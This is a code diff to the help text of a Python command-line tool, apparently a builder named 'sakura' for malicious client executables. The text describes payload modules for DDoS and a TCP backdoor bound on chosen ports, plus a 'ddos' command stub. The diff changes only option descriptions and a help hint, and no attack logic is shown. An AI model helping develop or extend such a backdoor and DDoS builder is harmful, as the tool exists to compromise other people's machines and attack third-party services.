@@ -92,8 +92,7 @@ def eval_command(f: tuple[str, list[str]]):
    Check applied options - 'build opts'
    Clear options list - 'build opts clear'{colorama.Style.RESET_ALL}
     - TAG      > tag - identifier for this executable.
-    - PAYLOAD  > payload - modules to load. Select all by typing 'all'. Example: 'ddos,backdoor'
-    - BACKDOOR > backdoor - use only if you have module 'backdoor'. Value - ports to bind tcp backdoor. Example: '65532,65531.65530,8282'
+    - BACKDOOR > Value - ports to bind tcp backdoor. Example: '65532,65531.65530,8282'. If not set (or set 0), backdoor will be disabled.
 {colorama.Fore.YELLOW}| Building executable{colorama.Style.RESET_ALL}
    {colorama.Fore.LIGHTCYAN_EX}Build via 'build client <type>'. Here's list of all types:{colorama.Style.RESET_ALL}
     - SOURCE   > Client source code on python. Ready for building on platforms, other than {sys.platform}.
@@ -108,7 +107,7 @@ def eval_command(f: tuple[str, list[str]]):
                                 return
             for command in COMMANDS:
                 print(f"{command} {(8-len(command))*' '} | {COMMANDS[command][0]}")
-            print(f"\n{colorama.Style.BRIGHT}If you didn't know, how to setup sakura, please run 'help setup'{colorama.Style.RESET_ALL}")
+            print(f"\n{colorama.Style.BRIGHT}If you didn't know, how to setup sakura, please run 'help setup'\nType 'help <command>' to see command usage.{colorama.Style.RESET_ALL}")
         case "kill":
             print(".. under construction ..")
         case "ddos":
